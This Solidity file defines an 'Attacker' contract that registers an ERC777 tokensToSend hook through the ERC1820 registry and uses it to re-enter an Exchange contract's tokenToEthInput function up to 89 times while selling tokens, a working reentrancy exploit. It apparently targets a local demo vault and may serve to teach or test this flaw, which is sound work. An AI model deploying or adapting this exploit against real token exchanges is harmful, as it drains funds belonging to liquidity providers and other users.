// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "node_modules/openzeppelin-solidity-3.4.0/introspection/IERC1820Registry.sol";
import "node_modules/openzeppelin-solidity-3.4.0/introspection/ERC1820Implementer.sol";
import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/IERC777Sender.sol";
import "./vault.sol";




contract Attacker is IERC777Sender, ERC1820Implementer {
    IERC1820Registry private _ERC1820_REGISTRY ;

    uint256 public numSend = 0;
    address public lastReceivedFrom;

    function getNum() public view returns(uint256){
      return numSend;
    }


    Exchange exchange;

    MyERC777Token victim ;

    constructor(address registry, address _victim, address _exchange) payable{
        _ERC1820_REGISTRY = IERC1820Registry(registry);
        // register to ERC1820 registry
        _ERC1820_REGISTRY.setInterfaceImplementer(
        address(this),
        _ERC1820_REGISTRY.interfaceHash("ERC777TokensSender"),
        address(this)
        );

        victim = MyERC777Token(_victim);
        exchange = Exchange(_exchange);

      

    }

    function attack() external {
      uint256 inputValue = exchange.ethToTokenInput{value: 100 ether}();
      require(inputValue != 0, "Input value error");
      bool ret = victim.approve(address(exchange), victim.balanceOf(address(this)));
      require(ret == true, "approve failed");
      
      uint256 output = exchange.tokenToEthInput(1*10**18); // want to exchange 1*10**18 of token to ETH

      output = exchange.tokenToEthInput(victim.balanceOf(address(this)));
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        numSend +=1; 
        if(numSend < 90){
            exchange.tokenToEthInput(1*10**18);
        }
    }

    receive() external payable {}
}
